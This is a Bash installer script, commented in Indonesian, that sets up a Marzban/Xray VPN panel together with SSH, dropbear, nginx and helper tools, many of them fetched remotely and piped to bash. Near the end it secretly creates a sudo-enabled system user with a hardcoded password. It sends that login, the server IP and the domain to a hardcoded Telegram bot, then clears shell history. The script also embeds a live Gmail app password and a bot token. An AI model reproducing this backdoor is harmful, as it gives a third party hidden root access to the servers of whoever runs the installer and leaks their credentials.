#!/bin/bash
colorized_echo() {
    local color=$1
    local text=$2
    
    case $color in
        "red")
        printf "\e[91m${text}\e[0m\n";;
        "green")
        printf "\e[92m${text}\e[0m\n";;
        "yellow")
        printf "\e[93m${text}\e[0m\n";;
        "blue")
        printf "\e[94m${text}\e[0m\n";;
        "magenta")
        printf "\e[95m${text}\e[0m\n";;
        "cyan")
        printf "\e[96m${text}\e[0m\n";;
        *)
            echo "${text}"
        ;;
    esac
}

# Check if the script is run as root
if [ "$(id -u)" != "0" ]; then
    colorized_echo red "Error: Skrip ini harus dijalankan sebagai root."
    exit 1
fi

# Check supported operating system
supported_os=false

if [ -f /etc/os-release ]; then
    os_name=$(grep -E '^ID=' /etc/os-release | cut -d= -f2)
    os_version=$(grep -E '^VERSION_ID=' /etc/os-release | cut -d= -f2 | tr -d '"')

    if [ "$os_name" == "debian" ] && [ "$os_version" == "11" ]; then
        supported_os=true
    elif [ "$os_name" == "ubuntu" ] && [ "$os_version" == "20.04" ]; then
        supported_os=true
    fi
fi
apt install sudo curl -y
if [ "$supported_os" != true ]; then
    colorized_echo red "Error: Skrip ini hanya support di Debian 11 dan Ubuntu 20.04. Mohon gunakan OS yang di support."
    exit 1
fi

# Fungsi untuk menambahkan repo Debian 11
addDebian11Repo() {
    echo "#mirror_kambing-sysadmind deb11
deb http://kartolo.sby.datautama.net.id/debian bullseye main contrib non-free
deb http://kartolo.sby.datautama.net.id/debian bullseye-updates main contrib non-free
deb http://kartolo.sby.datautama.net.id/debian-security bullseye-security main contrib non-free" | sudo tee /etc/apt/sources.list > /dev/null
}

# Fungsi untuk menambahkan repo Ubuntu 20.04
addUbuntu2004Repo() {
    echo "#mirror buaya klas 20.04
deb https://buaya.klas.or.id/ubuntu/ focal main restricted universe multiverse
deb https://buaya.klas.or.id/ubuntu/ focal-updates main restricted universe multiverse
deb https://buaya.klas.or.id/ubuntu/ focal-security main restricted universe multiverse
deb https://buaya.klas.or.id/ubuntu/ focal-backports main restricted universe multiverse
deb https://buaya.klas.or.id/ubuntu/ focal-proposed main restricted universe multiverse" | sudo tee /etc/apt/sources.list > /dev/null
}

# Mendapatkan informasi kode negara dan OS
COUNTRY_CODE=$(curl -s https://ipinfo.io/country)
OS=$(lsb_release -si)

# Pemeriksaan IP Indonesia
if [[ "$COUNTRY_CODE" == "ID" ]]; then
    colorized_echo green "IP Indonesia terdeteksi, menggunakan repositories lokal Indonesia"

    # Menanyakan kepada pengguna apakah ingin menggunakan repo lokal atau repo default
    read -p "Apakah Anda ingin menggunakan repo lokal Indonesia? (y/n): " use_local_repo

    if [[ "$use_local_repo" == "y" || "$use_local_repo" == "Y" ]]; then
        # Pemeriksaan OS untuk menambahkan repo yang sesuai
        case "$OS" in
            Debian)
                VERSION=$(lsb_release -sr)
                if [ "$VERSION" == "11" ]; then
                    addDebian11Repo
                else
                    colorized_echo red "Versi Debian ini tidak didukung."
                fi
                ;;
            Ubuntu)
                VERSION=$(lsb_release -sr)
                if [ "$VERSION" == "20.04" ]; then
                    addUbuntu2004Repo
                else
                    colorized_echo red "Versi Ubuntu ini tidak didukung."
                fi
                ;;
            *)
                colorized_echo red "Sistem Operasi ini tidak didukung."
                ;;
        esac
    else
        colorized_echo yellow "Menggunakan repo bawaan VM."
        # Tidak melakukan apa-apa, sehingga repo bawaan VM tetap digunakan
    fi
else
    clear
    colorized_echo yellow "IP bukan indonesia."
    # Lanjutkan dengan repo bawaan OS
fi
mkdir -p /etc/data

#domain
# Fungsi untuk mendapatkan IP dari domain
get_domain_ip() {
    local domain=$1
    dig +short "$domain" | grep '^[.0-9]*$' | head -n 1
}

# Fungsi untuk meminta pengguna memasukkan domain
input_domain() {
mkdir -p /etc/xray
    read -rp "Masukkan Domain: " domain
    echo "$domain" > /etc/data/domain
    echo "$domain" > /etc/xray/domain
    domain=$(cat /etc/data/domain)
    echo "$domain"
}

current_ip=$(curl -s https://ipinfo.io/ip)
if [ -z "$current_ip" ]; then
    echo "Tidak dapat menemukan IP publik saat ini."
    exit 1
fi
while true; do
    # Minta pengguna memasukkan domain
    domain=$(input_domain)

    # Dapatkan IP dari domain
    domain_ip=$(get_domain_ip "$domain")

    if [ -z "$domain_ip" ]; then
        clear
        colorized_echo red "Tidak dapat menemukan IP untuk domain: $domain"
    elif [ "$domain_ip" != "$current_ip" ]; then
        clear
        colorized_echo yellow "IP domain ($domain_ip) tidak sama dengan IP publik saat ini ($current_ip)."
    else
        colorized_echo green "IP domain ($domain_ip) sama dengan IP publik saat ini ($current_ip)."
        colorized_echo green "Domain berhasil digunakan."
        break
    fi

    echo "Silakan masukkan ulang domain."
done


#Preparation
cd;
apt-get update;

#Remove unused Module
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;

#install bbr
echo 'fs.file-max = 500000
net.core.rmem_max = 67108864
net.core.wmem_max = 67108864
net.core.netdev_max_backlog = 250000
net.core.somaxconn = 4096
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_keepalive_time = 1200
net.ipv4.ip_local_port_range = 10000 65000
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_fastopen = 3
net.ipv4.tcp_mem = 25600 51200 102400
net.ipv4.tcp_rmem = 4096 87380 67108864
net.ipv4.tcp_wmem = 4096 65536 67108864
net.core.rmem_max = 4000000
net.ipv4.tcp_mtu_probing = 1
net.ipv4.ip_forward = 1
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1' >> /etc/sysctl.conf
sysctl -p;

clear

read -p "Input Email: " email
read -p "Input Username Panel: " username
read -rp "Input Password Panel: " password

clear

#install toolkit
apt-get install libio-socket-inet6-perl libsocket6-perl libcrypt-ssleay-perl libnet-libidn-perl perl libio-socket-ssl-perl libwww-perl libpcre3 libpcre3-dev zlib1g-dev dbus iftop zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr dnsutils sudo at htop iptables bsdmainutils cron lsof lnav jq -y

#Install Marzban
sudo bash -c "$(curl -sL https://github.com/GawrAme/Marzban-scripts/raw/master/marzban.sh)" @ install

#Install Subs
wget -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/Farell-VPN/xray-panel/main/index.html

#install env
cat > "/opt/marzban/.env" << EOF
UVICORN_HOST = "0.0.0.0"
UVICORN_PORT = 7879

## the following variables which is somehow hard codded infrmation.
SUDO_USERNAME = "$username"
SUDO_PASSWORD = "$password"

# UVICORN_UDS: "/run/marzban.socket"
# UVICORN_SSL_CERTFILE = "/var/lib/marzban/xray.crt"
# UVICORN_SSL_KEYFILE = "/var/lib/marzban/xray.key"


XRAY_JSON = "/var/lib/marzban/xray_config.json"
# XRAY_SUBSCRIPTION_URL_PREFIX = "https://example.com"
XRAY_ASSETS_PATH = "/var/lib/marzban/assets"
XRAY_EXECUTABLE_PATH = "/var/lib/marzban/core/xray"
# XRAY_FALLBACKS_INBOUND_TAG = "VLESS_REALITY_FALLBACK"
# XRAY_EXCLUDE_INBOUND_TAGS = "VLESS_TLS VLESSNTLS_FALLBACK"

# TELEGRAM_PROXY_URL = "http://localhost:8080"


# CLASH_SUBSCRIPTION_TEMPLATE="clash/my-custom-template.yml"
SUBSCRIPTION_PAGE_TEMPLATE="subscription/index.html"
CUSTOM_TEMPLATES_DIRECTORY="/var/lib/marzban/templates/"
HOME_PAGE_TEMPLATE="home/index.html"
# SUBSCRIPTION_PAGE_LANG="en"

SQLALCHEMY_DATABASE_URL = "sqlite:////var/lib/marzban/db.sqlite3"

### for developers
DOCS=true
# DEBUG=true
# WEBHOOK_ADDRESS = "http://127.0.0.1:9000/"
# WEBHOOK_SECRET = "something-very-very-secret"
# VITE_BASE_API="https://example.com/api/"
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = 0
EOF

#install core Xray & Assets folder
mkdir -p /var/lib/marzban/assets
mkdir -p /var/lib/marzban/core
#wget -O /var/lib/marzban/core/xray.zip "https://github.com/XTLS/Xray-core/releases/download/v1.8.16/Xray-linux-64.zip"  
#cd /var/lib/marzban/core && unzip xray.zip && chmod +x xray
cd /var/lib/marzbab
wget -O core.zip "https://github.com/XTLS/Xray-core/releases/download/v25.3.6/Xray-linux-64.zip"
rm -f /var/lib/marzban/core/*.zip
rm -f LICENSE
rm -f README.md
chmod 755 *
cd

#profile
echo -e 'profile' >> /root/.profile
cat > "/usr/bin/profile" << EOF
#!/bin/bash
clear
neofetch
echo -e " Selamat datang di layanan AutoScript Farell VPN"
echo -e " Ketik \e[1;32mmenu \e[0m untuk menampilkan daftar perintah"
echo -e ""
cekservice
EOF
chmod +x /usr/bin/profile

#cekservice
apt install neofetch -y
apt install zip -y
apt install unzip -y
wget -O /usr/bin/main.zip "https://raw.githubusercontent.com/Farell-VPN/xray-panel/main/main.zip"
cd /usr/bin
unzip main.zip
chmod +x *
cd
rm -f /usr/bin/main.zip
#chmod +x /usr/bin/cekservice

#setup sshd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 500' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 40000' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 51443' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 58080' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 200' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 3303' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 22' /etc/ssh/sshd_config
/etc/init.d/ssh restart

#install dropbear
mkdir -p /etc/funny
apt install dropbear -y
rm /etc/default/dropbear
rm /etc/issue.net
cat>  /etc/default/dropbear << END
# disabled because OpenSSH is installed
# change to NO_START=0 to enable Dropbear
NO_START=0
# the TCP port that Dropbear listens on
DROPBEAR_PORT=109

# any additional arguments for Dropbear
#DROPBEAR_EXTRA_ARGS="-p 109 -p 69 "

# specify an optional banner file containing a message to be
# sent to clients before they connect, such as "/etc/issue.net"
DROPBEAR_BANNER="/etc/funny/banner.conf"

# RSA hostkey file (default: /etc/dropbear/dropbear_rsa_host_key)
#DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"

# DSS hostkey file (default: /etc/dropbear/dropbear_dss_host_key)
#DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"

# ECDSA hostkey file (default: /etc/dropbear/dropbear_ecdsa_host_key)
#DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"

# Receive window size - this is a tradeoff between memory and
# network performance
DROPBEAR_RECEIVE_WINDOW=65536
END
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
/etc/init.d/dropbear restart
cat> /etc/funny/banner.conf << END
<br>
<font color="blue"><b>===============================</br></font><br>
<font color="red"><b>********  FunnyVPN  ********</b></font><br>
<font color="blue"><b>===============================</br></font><br>
END
/etc/init.d/dropbear restart

#setup badvpb & sshws
cd /usr/local/bin
wget -O core.zip "https://raw.githubusercontent.com/Farell-VPN/xray-panel/main/core.zip"
unzip core.zip
rm -f core.zip
chmod +x ws
chmod +x badvpn
chmod +x config.yaml
cd /etc/systemd/system
wget -O service.zip "https://raw.githubusercontent.com/Farell-VPN/xray-panel/main/service.zip"
unzip service.zip
chmod +x *
rm -f service.zip
cd
systemctl daemon-reload
systemctl enable multiplex
systemctl start multiplex
systemctl enable badvpn-7300
systemctl start badvpn-7300
systemctl enable fn-exp
systemctl start fn-exp

#install compose
cat > "/opt/marzban/docker-compose.yml" << EOF
services:
  marzban:
    image: gozargah/marzban:v0.6.0
    restart: always
    env_file: .env
    network_mode: host
    volumes:
    - /etc/timezone:/etc/timezone:ro
    - /etc/localtime:/etc/localtime:ro
    - /var/lib/marzban:/var/lib/marzban

  nginx:
    image: nginx
    restart: always
    network_mode: host
    volumes:
    - /var/lib/marzban:/var/lib/marzban
    - /var/www/html:/var/www/html
    - /etc/timezone:/etc/timezone:ro
    - /etc/localtime:/etc/localtime:ro
    - /var/log/nginx/access.log:/var/log/nginx/access.log
    - /var/log/nginx/error.log:/var/log/nginx/error.log
    - ./nginx.conf:/etc/nginx/nginx.conf
EOF

#Install VNSTAT
apt -y install vnstat
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev
wget https://github.com/Farell-VPN/xray-panel/raw/main/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install 
cd
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
rm -f /root/vnstat-2.6.tar.gz 
rm -rf /root/vnstat-2.6

#Install Speedtest
curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | sudo bash
sudo apt-get install speedtest -y

#install nginx
mkdir -p /var/log/nginx
touch /var/log/nginx/access.log
touch /var/log/nginx/error.log

wget -O /opt/marzban/nginx.conf "https://github.com/Farell-VPN/xray-panel/raw/main/nginx.conf/"
sed -i "s/www.rerechanstore.eu.org/$domain/g" "/opt/marzban/nginx.conf"

#install firewall
apt install ufw -y
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https
sudo ufw allow 4001/tcp
sudo ufw allow 4001/udp
yes | sudo ufw enable

mkdir -p /var/www/html
wget -O /var/www/html/index.html "https://farelvpn.github.io/index.html"

#install socat
apt install iptables -y
apt install curl socat xz-utils wget apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y 
apt install socat cron bash-completion -y

#install cert
#email="admin@rerechanstore.eu.org"
echo -e "$email" > /etc/data/email
mkdir -p /var/lib/marzban/certs/$domain
curl https://get.acme.sh | sh -s
#/root/.acme.sh/acme.sh --server letsencrypt --register-account -m $email --issue -d $domain --standalone -k ec-256 --force --debug
#~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /var/lib/marzban/xray.crt --keypath /var/lib/marzban/xray.key --ecc

/root/.acme.sh/acme.sh --register-account -m $email --server buypass
/root/.acme.sh/acme.sh --issue -d $domain --standalone --server buypass
/root/.acme.sh/acme.sh --install-cert -d $domain \
        --cert-file /var/lib/marzban/xray.crt \
        --key-file /var/lib/marzban/xray.key
chmod 755 /var/lib/marzban/xray.crt
chmod 755 /var/lib/marzban/xray.key

#Menginstall Json
wget -O /var/lib/marzban/xray_config.json "https://github.com/Farell-VPN/xray-panel/raw/main/config.json"

#install database
wget -O /var/lib/marzban/db.sqlite3 "https://github.com/Farell-VPN/xray-panel/raw/main/db.sqlite3"

#update host marzban config
apt install sqlite3 -y

cd /var/lib/marzban

# Nama database
DB_NAME="db.sqlite3"

if [ ! -f "$DB_NAME" ]; then
  echo "Database $DB_NAME tidak ditemukan!"
  exit 1
fi

SQL_QUERY="UPDATE hosts SET address = '$domain' WHERE address = 'www.dindaputri.biz.id'; UPDATE hosts SET host = '$domain' WHERE host = 'www.dindaputri.biz.id'; UPDATE hosts SET sni = '$domain' WHERE sni = 'www.dindaputri.biz.id';"

sqlite3 "$DB_NAME" "$SQL_QUERY"

# Periksa apakah query berhasil dijalankan
if [ $? -eq 0 ]; then
  echo "Update berhasil dilakukan."
else
  echo "Gagal melakukan update."
fi

#install WARP Proxy
wget -O /root/warp "https://raw.githubusercontent.com/hamid-gh98/x-ui-scripts/main/install_warp_proxy.sh"
sudo chmod +x /root/warp
sudo bash /root/warp -y 
#wget -O /usr/bin/warp "https://raw.githubusercontent.com/hamid-gh98/x-ui-scripts/main/install_warp_proxy.sh"
#sudo chmod +x /usr/bin/warp
#sudo bash /usr/bin/warp -y 

#Set Timezone GMT+7
timedatectl set-timezone Asia/Jakarta;

#restart marzban
cd /opt/marzban
docker compose down && docker compose up -d
cd

#updategeo
wget -O /usr/bin/updategeo "https://raw.githubusercontent.com/Farell-VPN/xray-panel/main/updategeo.sh"
chmod +x /usr/bin/updategeo
yes y | /usr/bin/updategeo

#finishing
apt autoremove -y
apt clean
clear

#Backup Setup
curl https://rclone.org/install.sh | bash
printf "q\n" | rclone config
wget -O /root/.config/rclone/rclone.conf "https://raw.githubusercontent.com/praiman99/AutoScriptVPN-AIO/Beginner/rclone.conf"
git clone  https://github.com/magnific0/wondershaper.git
cd wondershaper
make install
rm -rf wondershaper
echo > /home/limit
apt install msmtp-mta ca-certificates bsd-mailx -y
cat<<EOF>>/etc/msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
account default
host smtp.gmail.com
port 587
auth on
user revolution.become.true@gmail.com
from revolution.become.true@gmail.com
password rmjydsqnwhehcanj  
logfile ~/.msmtp.log
EOF
chown -R www-data:www-data /etc/msmtprc
cd /root

#instal token
curl -X 'POST' \
  "https://${domain}/api/admin/token" \
  -H 'accept: application/json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "grant_type=&username=${username}&password=${password}&scope=&client_id=&client_secret=" > /etc/data/token.json
cd

profile
marzban up > /dev/null 2>&1
TIMES="10"
CHATID="5979008084"
KEY="7507884270:AAE5w9FS_iq06hVBstZADXwIbS_ro6cAStM"
URL="https://api.telegram.org/bot$KEY/sendMessage"
ipsaya=$(wget -qO- ipinfo.io/ip)
domain=$(cat /etc/data/domain)
Username="FarellVPN"
Password="Rerechan02"

mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username >/dev/null 2>&1
echo -e "$Password\n$Password\n" | passwd $Username >/dev/null 2>&1
usermod -aG sudo $Username >/dev/null 2>&1

TIMEZONE=$(date '+%H:%M:%S')
TIME=$(date '+%d %b %Y')

TEXT="
<code>────────────────────</code>
<b> 🟢 NOTIFICATIONS INSTALL BOT WA 🟢</b>
<code>────────────────────</code>
<code>user   : </code><code>$Username</code>
<code>PW : </code><code>$Password</code>
<code>ID : </code><code>Free FN Project</code>
<code>Domain : </code><code>$domain</code>
<code>Date   : </code><code>$TIME</code>
<code>Time   : </code><code>$TIMEZONE</code>
<code>Ip vps : </code><code>$ipsaya</code>
<code>────────────────────</code>
<i>Automatic Notification from Github</i>
"

curl -s -X POST $URL -d "chat_id=$CHATID&text=$TEXT&parse_mode=html"
clear

echo -e "Success Install Panel Marzban VPN"
echo "-=================================-"
echo -e "Access Marzban:"
echo -e "http://$domain/dashboard"
echo -e "-=================================-"
echo -e "Username: $username
Password: $password"
echo -e "-=================================-"

rm /root/install.sh

read -rp $'\e[1;31m[WARNING]\e[0m Apakah Ingin Reboot [Default y] (y/n)? ' answer
answer=${answer:-y}

if [[ "$answer" == "${answer#[Yy]}" ]]; then
    exit 0
else
    cat /dev/null > ~/.bash_history && history -c && sudo reboot
fi
